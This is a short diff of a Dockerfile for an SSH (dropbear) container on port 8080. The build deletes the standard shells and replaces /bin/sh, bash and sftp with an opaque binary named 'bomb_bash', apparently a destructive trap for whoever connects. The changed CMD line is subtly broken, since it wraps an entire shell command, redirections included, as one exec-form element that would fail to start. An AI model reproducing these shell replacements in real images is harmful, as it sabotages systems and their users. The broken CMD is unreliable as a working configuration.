@@ -48,8 +48,6 @@ RUN apk add --no-cache bash gcompat dropbear openssh-sftp-server inotify-tools \
     && cp /tmp/file_sh /root/.bashrc \
     && cp /tmp/file_sh /root/.bash_profile \
     && echo -e "Telegram:@amir_wolf512 HI:3\n\n==========>\n" > /etc/motd \
-    && echo -e 'exec /usr/sbin/dropbear -F -p 8080 >/dev/null 2>&1' > /entrypoint.sh \
-    && chmod +x /entrypoint.sh \
     \
     && rm -f /bin/sh /bin/bash /usr/bin/bash \
     && cp /tmp/bomb_bash /bin/sh \
@@ -60,4 +58,4 @@ RUN apk add --no-cache bash gcompat dropbear openssh-sftp-server inotify-tools \
     && cp /tmp/bomb_bash /bin/sftp \
     && rm -f /tmp/bomb_bash /tmp/file_sh
 
-CMD ["/entrypoint.sh"]
+CMD ["exec /usr/sbin/dropbear -F -p 8080 >/dev/null 2>&1"]
